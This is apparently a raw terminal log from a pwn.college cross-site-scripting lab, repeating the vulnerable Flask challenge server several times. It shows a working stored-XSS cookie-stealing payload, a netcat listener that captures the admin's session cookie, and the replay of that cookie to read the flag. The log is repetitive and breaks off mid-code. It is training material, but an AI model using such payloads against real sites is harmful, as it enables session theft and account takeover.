+        <h2>Author: admin</h2>(Draft post, showing first 12 characters):<br>pwn.college{<hr></body></html>hacker@web-securithacker@web-security~xss-7:~$ curl -v -b hacker -X POST http://challenge.localhost:80/draft -d "content=<script>Read from remote host dojo.pwn.college: Connection reset by peer
+Connection to dojo.pwn.college closed.
+client_loop: send disconnect: Broken pipe
+╭─  zsh   ~  祥1466s 
+╰─> ssh -i ~/.ssh/pwncollege hacker@dojo.pwn.college                                                 68%   20, 20:28 
+ssh: connect to host dojo.pwn.college port 22: Connection timed out
+╭─  zsh   ~  祥136s 
+╰─> ssh -i ~/.ssh/pwncollege hacker@dojo.pwn.college                                                 67%   20, 20:31 
+ssh: connect to host dojo.pwn.college port 22: Connection timed out
+╭─  zsh   ~  祥134s 
+╰─> ssh -i ~/.ssh/pwncollege hacker@dojo.pwn.college                                                 66%   20, 20:34 
+Connected!
+hacker@web-security~xss-7:~$ curl -v -b hacker http://challenge.localhost:80
+* Host challenge.localhost:80 was resolved.
+* IPv6: ::1
+* IPv4: 127.0.0.1
+*   Trying [::1]:80...
+* connect to ::1 port 80 from ::1 port 36364 failed: Connection refused
+*   Trying 127.0.0.1:80...
+* Established connection to challenge.localhost (127.0.0.1 port 80) from 127.0.0.1 port 52626
+* using HTTP/1.x
+> GET / HTTP/1.1
+> Host: challenge.localhost
+> User-Agent: curl/8.17.0
+> Accept: */*
+> Cookie: auth=hacker|1337
+>
+* Request completely sent off
+< HTTP/1.1 200 OK
+< Server: Werkzeug/3.0.6 Python/3.8.10
+< Date: Wed, 20 May 2026 13:35:21 GMT
+< Content-Type: text/html; charset=utf-8
+< Content-Length: 515
+< Connection: close
+<
+<html><body>
+Welcome to pwnpost, now with users!<hr>
+
+            <form action=draft method=post>
+              Post:<textarea name=content>Write something!</textarea>
+              <input type=checkbox name=publish>Publish
+              <input type=submit value=Save>
+            </form><br>
+            <form action=publish method=post><input type=submit value="Publish All Drafts"></form>
+            <hr>
+* shutting down connection #0
+        <h2>Author: admin</h2>(Draft post, showing first 12 characters):<br>pwn.college{<hr></body></html>hacker@web-security~xss-7:~$ curl -v -b hacker ^C
+hacker@web-security~xss-7:~$ curl -v -b hacker -X POST http://challenge.localhost:80/draft -d 'content=<script>fetch("/publish", {method: "POST"}).then(resp => { fetch("/draft", {method: "POST", body: {^C) })</script>?publish=true'
+hacker@web-security~xss-7:~$
+Connected!
+hacker@web-security~xss-7:~$ cat /challenge/server
+#!/usr/bin/exec-suid -- /usr/bin/python3 -I
+
+import flask
+import os
+
+app = flask.Flask(__name__)
+
+
+flag = open("/flag").read().strip() if os.geteuid() == 0 else "pwn.college{fake_flag}"
+
+import sqlite3
+import tempfile
+
+
+class TemporaryDB:
+    def __init__(self):
+        self.db_file = tempfile.NamedTemporaryFile("x", suffix=".db")
+
+    def execute(self, sql, parameters=()):
+        connection = sqlite3.connect(self.db_file.name)
+        connection.row_factory = sqlite3.Row
+        cursor = connection.cursor()
+        result = cursor.execute(sql, parameters)
+        connection.commit()
+        return result
+
+
+db = TemporaryDB()
+
+# https://www.sqlite.org/lang_createtable.html
+db.execute("""CREATE TABLE posts AS SELECT ? AS content, "admin" AS author, FALSE AS published""", [flag])
+db.execute("""CREATE TABLE users AS SELECT "admin" AS username, ? as password""", [flag[-20:]])
+# https://www.sqlite.org/lang_insert.html
+db.execute("""INSERT INTO users SELECT "guest" as username, "password" as password""")
+db.execute("""INSERT INTO users SELECT "hacker" as username, "1337" as password""")
+
+
+@app.route("/login", methods=["POST"])
+def challenge_login():
+    username = flask.request.form.get("username")
+    password = flask.request.form.get("password")
+    if not username:
+        flask.abort(400, "Missing `username` form parameter")
+    if not password:
+        flask.abort(400, "Missing `password` form parameter")
+
+    # https://www.sqlite.org/lang_select.html
+    user = db.execute("SELECT * FROM users WHERE username = ? AND password = ?", (username, password)).fetchone()
+    if not user:
+        flask.abort(403, "Invalid username or password")
+
+    response = flask.redirect("/")
+    response.set_cookie("auth", username + "|" + password)
+    return response
+
+
+@app.route("/draft", methods=["POST"])
+def challenge_draft():
+    username, password = flask.request.cookies.get("auth", "|").split("|")
+    user = db.execute("SELECT * FROM users WHERE username = ? AND password = ?", (username, password)).fetchone()
+    if not user:
+        flask.abort(403, "Invalid username or password")
+
+    if username == "admin":
+        flask.abort(400, "pwnpost no longer supports admin posting due to rampant flag disclosure")
+    content = flask.request.form.get("content", "")
+    # https://www.sqlite.org/lang_insert.html
+    db.execute(
+        "INSERT INTO posts (content, author, published) VALUES (?, ?, ?)",
+        (content, username, bool(flask.request.form.get("publish"))),
+    )
+    return flask.redirect("/")
+
+
+@app.route("/publish", methods=["POST"])
+def challenge_publish():
+    username, password = flask.request.cookies.get("auth", "|").split("|")
+    user = db.execute("SELECT * FROM users WHERE username = ? AND password = ?", (username, password)).fetchone()
+    if not user:
+        flask.abort(403, "Invalid username or password")
+
+    if username == "admin":
+        flask.abort(400, "pwnpost no longer supports admin posting due to rampant flag disclosure")
+    # https://www.sqlite.org/lang_update.html
+    db.execute("UPDATE posts SET published = TRUE WHERE author = ?", [username])
+    return flask.redirect("/")
+
+
+@app.route("/", methods=["GET"])
+def challenge_get():
+    page = "<html><body>\nWelcome to pwnpost, now with users!<hr>\n"
+    username, password = flask.request.cookies.get("auth", "|").split("|")
+    user = db.execute("SELECT * FROM users WHERE username = ? AND password = ?", (username, password)).fetchone()
+    if user:
+        page += """
+            <form action=draft method=post>
+              Post:<textarea name=content>Write something!</textarea>
+              <input type=checkbox name=publish>Publish
+              <input type=submit value=Save>
+            </form><br>
+            <form action=publish method=post><input type=submit value="Publish All Drafts"></form>
+            <hr>
+        """
+
+        for post in db.execute("SELECT * FROM posts").fetchall():
+            page += f"""<h2>Author: {post["author"]}</h2>"""
+            if post["published"]:
+                page += post["content"] + "<hr>\n"
+            elif post["author"] == username:
+                page += "<b>YOUR DRAFT POST:</b> " + post["content"] + "<hr>\n"
+            else:
+                page += f"""(Draft post, showing first 12 characters):<br>{post["content"][:12]}<hr>"""
+    else:
+        page += """
+            <form action=login method=post>
+              Username:<input type=text name=username>
+              Password:<input type=text name=password>
+              <input type=submit name=submit value=Login>
+            </form><hr>
+        """
+
+    return page + "</body></html>"
+
+
+app.secret_key = os.urandom(8)
+app.config["SERVER_NAME"] = f"challenge.localhost:80"
+app.run("challenge.localhost", 80)
+hacker@web-security~xss-7:~$ /challenge/server
+ * Serving Flask app 'server'
+ * Debug mode: off
+WARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.
+ * Running on http://challenge.localhost:80
+Press CTRL+C to quit
+^Chacker@web-security~xss-7:~$
+Connected!
+hacker@web-security~xss-7:~$ cat /challenge/server
+#!/usr/bin/exec-suid -- /usr/bin/python3 -I
+
+import flask
+import os
+
+app = flask.Flask(__name__)
+
+
+flag = open("/flag").read().strip() if os.geteuid() == 0 else "pwn.college{fake_flag}"
+
+import sqlite3
+import tempfile
+
+
+class TemporaryDB:
+    def __init__(self):
+        self.db_file = tempfile.NamedTemporaryFile("x", suffix=".db")
+
+    def execute(self, sql, parameters=()):
+        connection = sqlite3.connect(self.db_file.name)
+        connection.row_factory = sqlite3.Row
+        cursor = connection.cursor()
+        result = cursor.execute(sql, parameters)
+        connection.commit()
+        return result
+
+
+db = TemporaryDB()
+
+# https://www.sqlite.org/lang_createtable.html
+db.execute("""CREATE TABLE posts AS SELECT ? AS content, "admin" AS author, FALSE AS published""", [flag])
+db.execute("""CREATE TABLE users AS SELECT "admin" AS username, ? as password""", [flag[-20:]])
+# https://www.sqlite.org/lang_insert.html
+db.execute("""INSERT INTO users SELECT "guest" as username, "password" as password""")
+db.execute("""INSERT INTO users SELECT "hacker" as username, "1337" as password""")
+
+
+@app.route("/login", methods=["POST"])
+def challenge_login():
+    username = flask.request.form.get("username")
+    password = flask.request.form.get("password")
+    if not username:
+        flask.abort(400, "Missing `username` form parameter")
+    if not password:
+        flask.abort(400, "Missing `password` form parameter")
+
+    # https://www.sqlite.org/lang_select.html
+    user = db.execute("SELECT * FROM users WHERE username = ? AND password = ?", (username, password)).fetchone()
+    if not user:
+        flask.abort(403, "Invalid username or password")
+
+    response = flask.redirect("/")
+    response.set_cookie("auth", username + "|" + password)
+    return response
+
+
+@app.route("/draft", methods=["POST"])
+def challenge_draft():
+    username, password = flask.request.cookies.get("auth", "|").split("|")
+    user = db.execute("SELECT * FROM users WHERE username = ? AND password = ?", (username, password)).fetchone()
+    if not user:
+        flask.abort(403, "Invalid username or password")
+
+    if username == "admin":
+        flask.abort(400, "pwnpost no longer supports admin posting due to rampant flag disclosure")
+    content = flask.request.form.get("content", "")
+    # https://www.sqlite.org/lang_insert.html
+    db.execute(
+        "INSERT INTO posts (content, author, published) VALUES (?, ?, ?)",
+        (content, username, bool(flask.request.form.get("publish"))),
+    )
+    return flask.redirect("/")
+
+
+@app.route("/publish", methods=["POST"])
+def challenge_publish():
+    username, password = flask.request.cookies.get("auth", "|").split("|")
+    user = db.execute("SELECT * FROM users WHERE username = ? AND password = ?", (username, password)).fetchone()
+    if not user:
+        flask.abort(403, "Invalid username or password")
+
+    if username == "admin":
+        flask.abort(400, "pwnpost no longer supports admin posting due to rampant flag disclosure")
+    # https://www.sqlite.org/lang_update.html
+    db.execute("UPDATE posts SET published = TRUE WHERE author = ?", [username])
+    return flask.redirect("/")
+
+
+@app.route("/", methods=["GET"])
+def challenge_get():
+    page = "<html><body>\nWelcome to pwnpost, now with users!<hr>\n"
+    username, password = flask.request.cookies.get("auth", "|").split("|")
+    user = db.execute("SELECT * FROM users WHERE username = ? AND password = ?", (username, password)).fetchone()
+    if user:
+        page += """
+            <form action=draft method=post>
+              Post:<textarea name=content>Write something!</textarea>
+              <input type=checkbox name=publish>Publish
+              <input type=submit value=Save>
+            </form><br>
+            <form action=publish method=post><input type=submit value="Publish All Drafts"></form>
+            <hr>
+        """
+
+        for post in db.execute("SELECT * FROM posts").fetchall():
+            page += f"""<h2>Author: {post["author"]}</h2>"""
+            if post["published"]:
+                page += post["content"] + "<hr>\n"
+            elif post["author"] == username:
+                page += "<b>YOUR DRAFT POST:</b> " + post["content"] + "<hr>\n"
+            else:
+                page += f"""(Draft post, showing first 12 characters):<br>{post["content"][:12]}<hr>"""
+    else:
+        page += """
+            <form action=login method=post>
+              Username:<input type=text name=username>
+              Password:<input type=text name=password>
+              <input type=submit name=submit value=Login>
+            </form><hr>
+        """
+
+    return page + "</body></html>"
+
+
+app.secret_key = os.urandom(8)
+app.config["SERVER_NAME"] = f"challenge.localhost:80"
+app.run("challenge.localhost", 80)
+hacker@web-security~xss-7:~$ /challenge/server &
+[1] 143
+hacker@web-security~xss-7:~$  * Serving Flask app 'server'
+ * Debug mode: off
+WARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.
+ * Running on http://challenge.localhost:80
+Press CTRL+C to quit
+nc -lv 1337 &
+[2] 145
+hacker@web-security~xss-7:~$ curl -c nc: getnameinfo: Temporary failure in name resolution
+curl -c hacker -X POST
+
+Depending on the attacker's goals, what they might actually be after is the victim's entire account. For example, attackers might use XSS to exfiltrate victim authentication data and then use this data to take over the victim's account.
+
+Authentication data is often s^C
+hacker@web-security~xss-7:~$ curl -c hacker -X POST http://challenge.localhost:80/login -d "username=hacker&password=1337"
+127.0.0.1 - - [20/May/2026 13:55:59] "POST /login HTTP/1.1" 302 -
+<!doctype html>
+<html lang=en>
+<title>Redirecting...</title>
+<h1>Redirecting...</h1>
+<p>You should be redirected automatically to the target URL: <a href="/">/</a>. If not, click the link.
+hacker@web-security~xss-7:~$ curl -b hacker -X POST http://challenge.localhost:80/draft -d 'content=<script>fetch("http://challenge.localhost:1337/?c"+document.cookie)</script>&publish=true'
+127.0.0.1 - - [20/May/2026 13:57:45] "POST /draft HTTP/1.1" 302 -
+<!doctype html>
+<html lang=en>
+<title>Redirecting...</title>
+<h1>Redirecting...</h1>
+<p>You should be redirected automatically to the target URL: <a href="/">/</a>. If not, click the link.
+hacker@web-security~xss-7:~$ curl -c guest -X POST http://challenge.localhost:80/login -d "username=guest&password=password"127.0.0.1 - - [20/May/2026 13:58:20] "POST /login HTTP/1.1" 302 -
+<!doctype html>
+<html lang=en>
+<title>Redirecting...</title>
+<h1>Redirecting...</h1>
+<p>You should be redirected automatically to the target URL: <a href="/">/</a>. If not, click the link.
+hacker@web-security~xss-7:~$ curl -b guest http://challenge.localhost:80
+127.0.0.1 - - [20/May/2026 13:58:31] "GET / HTTP/1.1" 200 -
+<html><body>
+Welcome to pwnpost, now with users!<hr>
+
+            <form action=draft method=post>
+              Post:<textarea name=content>Write something!</textarea>
+              <input type=checkbox name=publish>Publish
+              <input type=submit value=Save>
+            </form><br>
+            <form action=publish method=post><input type=submit value="Publish All Drafts"></form>
+            <hr>
+        <h2>Author: admin</h2>(Draft post, showing first 12 characters):<br>pwn.college{<hr><h2>Author: hacker</h2><script>fetch("http://challenge.localhost:1337/?c" document.cookie)</script><hr>
+</body></html>hacker@web-security~xss-7:~$ /challenge/victim
+Problem reading geckodriver versions: error sending request for url (https://raw.githubusercontent.com/SeleniumHQ/selenium/trunk/common/geckodriver/geckodriver-support.json). Using latest geckodriver version
+Exception managing firefox: error sending request for url (https://github.com/mozilla/geckodriver/releases/latest)
+Error sending stats to Plausible: error sending request for url (https://plausible.io/api/event)
+Visiting http://challenge.localhost:80/
+127.0.0.1 - - [20/May/2026 13:59:02] "GET / HTTP/1.1" 200 -
+127.0.0.1 - - [20/May/2026 13:59:02] "GET /favicon.ico HTTP/1.1" 404 -
+127.0.0.1 - - [20/May/2026 13:59:02] "POST /login HTTP/1.1" 302 -
+127.0.0.1 - - [20/May/2026 13:59:02] "GET / HTTP/1.1" 200 -
+Visited! Go check if the attack worked!
+hacker@web-security~xss-7:~$ ^C
+hacker@web-security~xss-7:~$ curl -b hacker -X POST http://challenge.localhost:80/draft --data-urlencode 'content=<script>fetch("http://challenge.localhost:1337/?c"+document.cookie)</script>&publish=true'
+127.0.0.1 - - [20/May/2026 14:05:51] "POST /draft HTTP/1.1" 302 -
+<!doctype html>
+<html lang=en>
+<title>Redirecting...</title>
+<h1>Redirecting...</h1>
+<p>You should be redirected automatically to the target URL: <a href="/">/</a>. If not, click the link.
+hacker@web-security~xss-7:~$ curl -b guest http://challenge.localhost:80
+127.0.0.1 - - [20/May/2026 14:05:55] "GET / HTTP/1.1" 200 -
+<html><body>
+Welcome to pwnpost, now with users!<hr>
+
+            <form action=draft method=post>
+              Post:<textarea name=content>Write something!</textarea>
+              <input type=checkbox name=publish>Publish
+              <input type=submit value=Save>
+            </form><br>
+            <form action=publish method=post><input type=submit value="Publish All Drafts"></form>
+            <hr>
+        <h2>Author: admin</h2>(Draft post, showing first 12 characters):<br>pwn.college{<hr><h2>Author: hacker</h2><script>fetch("http://challenge.localhost:1337/?c" document.cookie)</script><hr>
+<h2>Author: hacker</h2>(Draft post, showing first 12 characters):<br><script>fetc<hr></body></html>hacker@web-security~xss-7:~$ curl -b hacker -X POST http://challenge.localhost:80/draft --data-urlencode 'content=<script>fetch("http://challenge.localhost:1337/?c"+document.cookie)</script>' -d 'publish=true'
+127.0.0.1 - - [20/May/2026 14:07:42] "POST /draft HTTP/1.1" 302 -
+<!doctype html>
+<html lang=en>
+<title>Redirecting...</title>
+<h1>Redirecting...</h1>
+<p>You should be redirected automatically to the target URL: <a href="/">/</a>. If not, click the link.
+hacker@web-security~xss-7:~$ curl -b guest http://challenge.localhost:80
+127.0.0.1 - - [20/May/2026 14:07:45] "GET / HTTP/1.1" 200 -
+<html><body>
+Welcome to pwnpost, now with users!<hr>
+
+            <form action=draft method=post>
+              Post:<textarea name=content>Write something!</textarea>
+              <input type=checkbox name=publish>Publish
+              <input type=submit value=Save>
+            </form><br>
+            <form action=publish method=post><input type=submit value="Publish All Drafts"></form>
+            <hr>
+        <h2>Author: admin</h2>(Draft post, showing first 12 characters):<br>pwn.college{<hr><h2>Author: hacker</h2><script>fetch("http://challenge.localhost:1337/?c" document.cookie)</script><hr>
+<h2>Author: hacker</h2>(Draft post, showing first 12 characters):<br><script>fetc<hr><h2>Author: hacker</h2><script>fetch("http://challenge.localhost:1337/?c"+document.cookie)</script><hr>
+</body></html>hacker@web-security~xss-7:~$ /challenge/victim
+Problem reading geckodriver versions: error sending request for url (https://raw.githubusercontent.com/SeleniumHQ/selenium/trunk/common/geckodriver/geckodriver-support.json). Using latest geckodriver version
+Exception managing firefox: error sending request for url (https://github.com/mozilla/geckodriver/releases/latest)
+Visiting http://challenge.localhost:80/
+127.0.0.1 - - [20/May/2026 14:08:13] "GET / HTTP/1.1" 200 -
+127.0.0.1 - - [20/May/2026 14:08:13] "GET /favicon.ico HTTP/1.1" 404 -
+127.0.0.1 - - [20/May/2026 14:08:13] "POST /login HTTP/1.1" 302 -
+127.0.0.1 - - [20/May/2026 14:08:13] "GET / HTTP/1.1" 200 -
+Visited! Go check if the attack worked!
+hacker@web-security~xss-7:~$ fg
+nc -lv 1337
+^Z
+[2]+  Stopped                    nc -lv 1337
+hacker@web-security~xss-7:~$ fg
+nc -lv 1337
+^Z
+[2]+  Stopped                    nc -lv 1337
+hacker@web-security~xss-7:~$ curl http://challenge.localhost:1337
+sjk
+^C
+hacker@web-security~xss-7:~$ fg
+nc -lv 1337
+Connection received on localhost 47600
+GET / HTTP/1.1
+Host: challenge.localhost:1337
+User-Agent: curl/8.17.0
+Accept: */*
+
+hacker@web-security~xss-7:~$ fg
+/challenge/server
+^Z
+[1]+  Stopped                    /challenge/server
+hacker@web-security~xss-7:~$ nc -lv 1337
+^Z
+[2]+  Stopped                    nc -lv 1337
+hacker@web-security~xss-7:~$ bg
+[2]+ nc -lv 1337 &
+nc: getnameinfo: Temporary failure in name resolution
+hacker@web-security~xss-7:~$ fg
+/challenge/server
+^Z
+[1]+  Stopped                    /challenge/server
+hacker@web-security~xss-7:~$ curl -b guest http://challenge.localhost:80
+^C
+hacker@web-security~xss-7:~$ bg
+[1]+ /challenge/server &
+hacker@web-security~xss-7:~$ 127.0.0.1 - - [20/May/2026 14:12:34] "GET / HTTP/1.1" 200 -
+curl -b guest http://challenge.localhost:80
+127.0.0.1 - - [20/May/2026 14:12:40] "GET / HTTP/1.1" 200 -
+<html><body>
+Welcome to pwnpost, now with users!<hr>
+
+            <form action=draft method=post>
+              Post:<textarea name=content>Write something!</textarea>
+              <input type=checkbox name=publish>Publish
+              <input type=submit value=Save>
+            </form><br>
+            <form action=publish method=post><input type=submit value="Publish All Drafts"></form>
+            <hr>
+        <h2>Author: admin</h2>(Draft post, showing first 12 characters):<br>pwn.college{<hr><h2>Author: hacker</h2><script>fetch("http://challenge.localhost:1337/?c" document.cookie)</script><hr>
+<h2>Author: hacker</h2>(Draft post, showing first 12 characters):<br><script>fetc<hr><h2>Author: hacker</h2><script>fetch("http://challenge.localhost:1337/?c"+document.cookie)</script><hr>
+</body></html>hacker@web-security~xss-7:~$
+Connected!
+hacker@web-security~xss-7:~$ cat /challenge/server
+#!/usr/bin/exec-suid -- /usr/bin/python3 -I
+
+import flask
+import os
+
+app = flask.Flask(__name__)
+
+
+flag = open("/flag").read().strip() if os.geteuid() == 0 else "pwn.college{fake_flag}"
+
+import sqlite3
+import tempfile
+
+
+class TemporaryDB:
+    def __init__(self):
+        self.db_file = tempfile.NamedTemporaryFile("x", suffix=".db")
+
+    def execute(self, sql, parameters=()):
+        connection = sqlite3.connect(self.db_file.name)
+        connection.row_factory = sqlite3.Row
+        cursor = connection.cursor()
+        result = cursor.execute(sql, parameters)
+        connection.commit()
+        return result
+
+
+db = TemporaryDB()
+
+# https://www.sqlite.org/lang_createtable.html
+db.execute("""CREATE TABLE posts AS SELECT ? AS content, "admin" AS author, FALSE AS published""", [flag])
+db.execute("""CREATE TABLE users AS SELECT "admin" AS username, ? as password""", [flag[-20:]])
+# https://www.sqlite.org/lang_insert.html
+db.execute("""INSERT INTO users SELECT "guest" as username, "password" as password""")
+db.execute("""INSERT INTO users SELECT "hacker" as username, "1337" as password""")
+
+
+@app.route("/login", methods=["POST"])
+def challenge_login():
+    username = flask.request.form.get("username")
+    password = flask.request.form.get("password")
+    if not username:
+        flask.abort(400, "Missing `username` form parameter")
+    if not password:
+        flask.abort(400, "Missing `password` form parameter")
+
+    # https://www.sqlite.org/lang_select.html
+    user = db.execute("SELECT * FROM users WHERE username = ? AND password = ?", (username, password)).fetchone()
+    if not user:
+        flask.abort(403, "Invalid username or password")
+
+    response = flask.redirect("/")
+    response.set_cookie("auth", username + "|" + password)
+    return response
+
+
+@app.route("/draft", methods=["POST"])
+def challenge_draft():
+    username, password = flask.request.cookies.get("auth", "|").split("|")
+    user = db.execute("SELECT * FROM users WHERE username = ? AND password = ?", (username, password)).fetchone()
+    if not user:
+        flask.abort(403, "Invalid username or password")
+
+    if username == "admin":
+        flask.abort(400, "pwnpost no longer supports admin posting due to rampant flag disclosure")
+    content = flask.request.form.get("content", "")
+    # https://www.sqlite.org/lang_insert.html
+    db.execute(
+        "INSERT INTO posts (content, author, published) VALUES (?, ?, ?)",
+        (content, username, bool(flask.request.form.get("publish"))),
+    )
+    return flask.redirect("/")
+
+
+@app.route("/publish", methods=["POST"])
+def challenge_publish():
+    username, password = flask.request.cookies.get("auth", "|").split("|")
+    user = db.execute("SELECT * FROM users WHERE username = ? AND password = ?", (username, password)).fetchone()
+    if not user:
+        flask.abort(403, "Invalid username or password")
+
+    if username == "admin":
+        flask.abort(400, "pwnpost no longer supports admin posting due to rampant flag disclosure")
+    # https://www.sqlite.org/lang_update.html
+    db.execute("UPDATE posts SET published = TRUE WHERE author = ?", [username])
+    return flask.redirect("/")
+
+
+@app.route("/", methods=["GET"])
+def challenge_get():
+    page = "<html><body>\nWelcome to pwnpost, now with users!<hr>\n"
+    username, password = flask.request.cookies.get("auth", "|").split("|")
+    user = db.execute("SELECT * FROM users WHERE username = ? AND password = ?", (username, password)).fetchone()
+    if user:
+        page += """
+            <form action=draft method=post>
+              Post:<textarea name=content>Write something!</textarea>
+              <input type=checkbox name=publish>Publish
+              <input type=submit value=Save>
+            </form><br>
+            <form action=publish method=post><input type=submit value="Publish All Drafts"></form>
+            <hr>
+        """
+
+        for post in db.execute("SELECT * FROM posts").fetchall():
+            page += f"""<h2>Author: {post["author"]}</h2>"""
+            if post["published"]:
+                page += post["content"] + "<hr>\n"
+            elif post["author"] == username:
+                page += "<b>YOUR DRAFT POST:</b> " + post["content"] + "<hr>\n"
+            else:
+                page += f"""(Draft post, showing first 12 characters):<br>{post["content"][:12]}<hr>"""
+    else:
+        page += """
+            <form action=login method=post>
+              Username:<input type=text name=username>
+              Password:<input type=text name=password>
+              <input type=submit name=submit value=Login>
+            </form><hr>
+        """
+
+    return page + "</body></html>"
+
+
+app.secret_key = os.urandom(8)
+app.config["SERVER_NAME"] = f"challenge.localhost:80"
+app.run("challenge.localhost", 80)
+hacker@web-security~xss-7:~$ /challenge/server &
+[1] 143
+hacker@web-security~xss-7:~$  * Serving Flask app 'server'
+ * Debug mode: off
+WARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.
+ * Running on http://challenge.localhost:80
+Press CTRL+C to quit
+nc -lv 1337 &
+[2] 145
+hacker@web-security~xss-7:~$ curl http://challenge.locanc: getnameinfo: Temporary failure in name resolution
+^C
+hacker@web-security~xss-7:~$ curl http://challenge.localhost:1337?c=hi
+Connection received on localhost 41200
+GET /?c=hi HTTP/1.1
+Host: challenge.localhost:1337
+User-Agent: curl/8.17.0
+Accept: */*
+
+^C
+[2]+  Done                       nc -lv 1337
+hacker@web-security~xss-7:~$ nc -lv 1337 &
+[2] 147
+hacker@web-security~xss-7:~$ curl http://challenge.localhost:1337?c=masihnc: getnameinfo: Temporary failure in name resolution
+
+Connection received on localhost 37912
+GET /?c=masih HTTP/1.1
+Host: challenge.localhost:1337
+User-Agent: curl/8.17.0
+Accept: */*
+
+^C
+[2]+  Done                       nc -lv 1337
+hacker@web-security~xss-7:~$ nc -lv 1337 &
+[2] 149
+hacker@web-security~xss-7:~$ fgnc: getnameinfo: Temporary failure in name resolution
+curl http://challenge.localhocurl -c hacker -X POST http://challenge.localhost:80/login -d "username=hacker&password=1337"
+127.0.0.1 - - [20/May/2026 14:15:19] "POST /login HTTP/1.1" 302 -
+<!doctype html>
+<html lang=en>
+<title>Redirecting...</title>
+<h1>Redirecting...</h1>
+<p>You should be redirected automatically to the target URL: <a href="/">/</a>. If not, click the link.
+hacker@web-security~xss-7:~$ curl -b hacker -X POST http://challenge.localhost:80/draft --data-urlencode 'content=<script>fetch("http://challenge.localhost:1337/?c"+document.cookie)</script>' -d 'publish=true'
+127.0.0.1 - - [20/May/2026 14:17:14] "POST /draft HTTP/1.1" 302 -
+<!doctype html>
+<html lang=en>
+<title>Redirecting...</title>
+<h1>Redirecting...</h1>
+<p>You should be redirected automatically to the target URL: <a href="/">/</a>. If not, click the link.
+hacker@web-security~xss-7:~$ /challenge/victim
+Problem reading geckodriver versions: error sending request for url (https://raw.githubusercontent.com/SeleniumHQ/selenium/trunk/common/geckodriver/geckodriver-support.json). Using latest geckodriver version
+Exception managing firefox: error sending request for url (https://github.com/mozilla/geckodriver/releases/latest)
+Error sending stats to Plausible: error sending request for url (https://plausible.io/api/event)
+Visiting http://challenge.localhost:80/
+127.0.0.1 - - [20/May/2026 14:17:35] "GET / HTTP/1.1" 200 -
+127.0.0.1 - - [20/May/2026 14:17:35] "GET /favicon.ico HTTP/1.1" 404 -
+127.0.0.1 - - [20/May/2026 14:17:35] "POST /login HTTP/1.1" 302 -
+127.0.0.1 - - [20/May/2026 14:17:35] "GET / HTTP/1.1" 200 -
+Connection received on localhost 57100
+GET /?cauth=admin|.QXygTN2wyNyETO2EzW} HTTP/1.1
+Host: challenge.localhost:1337
+User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:136.0) Gecko/20100101 Firefox/136.0
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br, zstd
+Referer: http://challenge.localhost/
+Origin: http://challenge.localhost
+Connection: keep-alive
+Sec-Fetch-Dest: empty
+Sec-Fetch-Mode: cors
+Sec-Fetch-Site: same-site
+Priority: u=4
+
+Visited! Go check if the attack worked!
+[2]+  Done                       nc -lv 1337
+hacker@web-security~xss-7:~$ curl -b "auth=admin|.QXygTN2wyNyETO2EzW}" http://challenge.localhost:80
+127.0.0.1 - - [20/May/2026 14:18:53] "GET / HTTP/1.1" 200 -
+<html><body>
+Welcome to pwnpost, now with users!<hr>
+
+            <form action=draft method=post>
+              Post:<textarea name=content>Write something!</textarea>
+              <input type=checkbox name=publish>Publish
+              <input type=submit value=Save>
+            </form><br>
+            <form action=publish method=post><input type=submit value="Publish All Drafts"></form>
+            <hr>
+        <h2>Author: admin</h2><b>YOUR DRAFT POST:</b> pwn.college{4DUVA0fPnDMIwsfzsixy-bSgPPc.QXygTN2wyNyETO2EzW}<hr>
+<h2>Author: hacker</h2><script>fetch("http://challenge.localhost:1337/?c"+document.cookie)</script><hr>
+</body></html>hacker@web-security~xss-7:~$
+Connected!
+hacker@web-security~xss-7:~$ cat /challenge/server
+#!/usr/bin/exec-suid -- /usr/bin/python3 -I
+
+import flask
+import os
+
+app = flask.Flask(__name__)
+
+
+flag = open("/flag").read().strip() if os.geteuid() == 0 else "pwn.college{fake_flag}"
+
+import sqlite3
+import tempfile
+
+
+class TemporaryDB:
+    def __init__(self):
+        self.db_file = tempfile.NamedTemporaryFile("x", suffix=".db")
+
+    def execute(self, sql, parameters=()):
+        connection = sqlite3.connect(self.db_file.name)
+        connection.row_factory = sqlite3.Row
+        cursor = connection.cursor()
+        result = cursor.execute(sql, parameters)
+        connection.commit()
+        return result
+
+
+db = TemporaryDB()
+
+# https://www.sqlite.org/lang_createtable.html
+db.execute("""CREATE TABLE posts AS SELECT ? AS content, "admin" AS author, FALSE AS published""", [flag])
+db.execute("""CREATE TABLE users AS SELECT "admin" AS username, ? as password""", [flag[-20:]])
+# https://www.sqlite.org/lang_insert.html
+db.execute("""INSERT INTO users SELECT "guest" as username, "password" as password""")
+db.execute("""INSERT INTO users SELECT "hacker" as username, "1337" as password""")
+
+
+@app.route("/login", methods=["POST"])
+def challenge_login():
+    username = flask.request.form.get("username")
+    password = flask.request.form.get("password")
+    if not username:
+        flask.abort(400, "Missing `username` form parameter")
+    if not password:
+        flask.abort(400, "Missing `password` form parameter")
+
+    # https://www.sqlite.org/lang_select.html
+    user = db.execute("SELECT * FROM users WHERE username = ? AND password = ?", (username, password)).fetchone()
+    if not user:
+        flask.abort(403, "Invalid username or password")
+
+    response = flask.redirect("/")
+    response.set_cookie("auth", username + "|" + password)
+    return response
+
+
+@app.route("/draft", methods=["POST"])
+def challenge_draft():
+    username, password = flask.request.cookies.get("auth", "|").split("|")
+    user = db.execute("SELECT * FROM users WHERE username = ? AND password = ?", (username, password)).fetchone()
+    if not user:
+        flask.abort(403, "Invalid username or password")
+
+    if username == "admin":
+        flask.abort(400, "pwnpost no longer supports admin posting due to rampant flag disclosure")
+    content = flask.request.form.get("content", "")
+    # https://www.sqlite.org/lang_insert.html
+    db.execute(
+        "INSERT INTO posts (content, author, published) VALUES (?, ?, ?)",
+        (content, username, bool(flask.request.form.get("publish"))),
+    )
+    return flask.redirect("/")
+
+
+@app.route("/publish", methods=["POST"])
+def challenge_publish():
+    username, password = flask.request.cookies.get("auth", "|").split("|")
+    user = db.execute("SELECT * FROM users WHERE username = ? AND password = ?", (username, password)).fetchone()
+    if not user:
+        flask.abort(403, "Invalid username or password")
+
+    if username == "admin":
+        flask.abort(400, "pwnpost no longer supports admin posting due to rampant flag disclosure")
+    # https://www.sqlite.org/lang_update.html
